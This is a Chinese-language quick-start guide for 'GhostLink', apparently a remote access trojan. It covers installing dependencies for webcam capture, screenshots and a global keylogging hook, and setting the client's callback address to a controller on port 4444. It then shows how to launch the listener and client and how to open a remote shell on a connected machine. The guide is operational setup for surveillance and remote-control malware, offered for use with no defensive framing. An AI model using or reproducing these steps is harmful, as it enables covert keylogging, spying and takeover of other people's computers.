# 快速入门

本指南将帮助你从零开始搭建 GhostLink 运行环境。

---

## 环境要求

| 组件 | 最低版本 | 说明 |
| --- | --- | --- |
| Python | ≥ 3.8 | 推荐 3.10+ |
| 操作系统 | Windows 10+ | 主要支持 Windows（部分功能依赖 pywin32） |
| 网络 | TCP 可达 | 客户端需能连接到服务端的 IP:Port |

> **注意**：文件管理中的 NTFS 特性（ADS 数据流、MFT 引用号等）仅在 Windows NTFS 文件系统上可用。

---

## 安装依赖

```bash
pip install -r requirements.txt
```

或手动安装：

```bash
pip install opencv-python>=4.5.0 numpy>=1.20.0 Pillow>=9.0.0 pywin32>=300 pynput>=1.7.0
```

各依赖的用途：

| 依赖 | 用途 |
| --- | --- |
| `opencv-python` | 摄像头帧捕获、屏幕/摄像头图像显示 |
| `numpy` | 图像数据缓冲区处理 |
| `Pillow` | 屏幕截图（ImageGrab）、图标提取 |
| `pywin32` | Windows API：文件管理、磁盘信息、版本信息、GDI 图标 |
| `pynput` | 全局键盘钩子（键盘记录模块） |

---

## 配置客户端

编辑 `客户端.py`，修改连接地址为你的控制端 IP：

```python
# 客户端.py 第 21 行
IP, PORT = '192.168.0.103', 4444  # 改为控制端的实际 IP
```

- `IP`：运行 `后台.py` 的机器的 IP 地址
- `PORT`：与 `后台.py` 中的 `PORT` 保持一致（默认 4444）

---

## 启动运行

### 方法一：分别启动

**终端 1 - 控制端：**

```bash
python 后台.py
```

输出：

```text
[*] 服务器正在监听 0.0.0.0:4444 ...
```

**终端 2 - 被控端：**

```bash
python 客户端.py
```

### 方法二：一键启动

双击 `启动.bat`，会自动打开两个命令行窗口分别运行控制端和被控端。

---

## 首次连接验证

1. 控制端出现 `[+] 新客户端已连接：('x.x.x.x', xxxxx)` 表示连接成功
2. 在控制端输入 `list` 查看在线客户端
3. 尝试 `shell 1` 进入远程 Shell，输入 `whoami` 测试

```text
请输入命令：list

在线客户端（共 1 个）：
  [1] ('192.168.0.105', 54321)

请输入命令：shell 1
[('192.168.0.105', 54321)] 已进入 Shell 模式，输入 0 返回菜单
Shell> whoami
desktop-xxx\admin
Shell> 0
```

---

## 下一步

- 阅读 [用户指南](User-Guide) 了解所有功能的详细用法
- 阅读 [协议参考](Protocol-Reference) 了解通信协议细节
- 阅读 [架构说明](Architecture) 了解代码设计思路
